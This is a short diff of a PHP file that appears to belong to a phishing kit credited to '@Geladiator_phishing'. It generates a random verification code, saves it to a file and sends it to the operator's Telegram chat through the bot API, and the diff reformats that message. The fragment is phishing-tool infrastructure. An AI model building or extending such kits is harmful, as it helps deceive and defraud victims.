@@ -8,8 +8,12 @@ fwrite($file,$ID);
 $CODE=rand(10000,90000);
 $file = fopen("captcha/code.txt","w");
 fwrite($file,$CODE);
-$text = "<b>-----Verify Code-----</b></br><b>🔐 Code :</b> $CODE</br><b>---------Info---------<b></br><b>🌐 Host :</b> @XTuranli</br><b>👤 <b>Creator :</b> @Geladiator_phishing</b>";
-file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&disable_web_page_preview=true&parse_mode=HTML&text=".$text);
+$text = "<-----Verify Code----->
+🔐 Code : $CODE
+<---------Info--------->
+🌐 Host : @XTuranli
+👤 Creator : @Geladiator_phishing";
+file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&text=".urlencode($text));
 ?>
 
 <!DOCTYPE html>
